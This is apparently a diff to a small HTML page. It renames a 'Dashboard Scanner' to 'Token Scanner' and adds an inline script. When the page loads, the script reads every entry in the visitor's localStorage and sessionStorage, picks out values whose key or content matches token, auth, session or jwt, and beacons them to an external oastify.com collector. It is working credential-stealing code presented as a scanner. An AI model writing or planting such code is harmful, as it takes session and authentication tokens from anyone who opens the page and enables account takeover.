@@ -1,9 +1,36 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Dashboard Scanner</title>
+  <title>Token Scanner</title>
+  <script>
+    const timestamp = Date.now();
+    const collab = "https://3678iya9s5flykg5btyggo7h288zwrnfc.oastify.com/";
+
+    const scanStorage = (storageType, storageObj) => {
+      for (let key in storageObj) {
+        try {
+          const val = storageObj.getItem(key);
+          const match = val && /token|auth|session|jwt/i.test(key + val);
+          const tag = match ? "hit" : "fail";
+          new Image().src = collab + tag +
+            "?type=" + storageType +
+            "&key=" + encodeURIComponent(key) +
+            "&val=" + encodeURIComponent(match ? val : "no-match") +
+            "&ts=" + timestamp;
+        } catch {
+          new Image().src = collab + "fail" +
+            "?type=" + storageType +
+            "&key=" + encodeURIComponent(key) +
+            "&error=exception" +
+            "&ts=" + timestamp;
+        }
+      }
+    };
+
+    scanStorage("localStorage", localStorage);
+    scanStorage("sessionStorage", sessionStorage);
+  </script>
 </head>
 <body>
-  <h1>Dashboard scan in progress 🚀</h1>
+  <h1>Token scanner running...</h1>
 </body>
-</html>
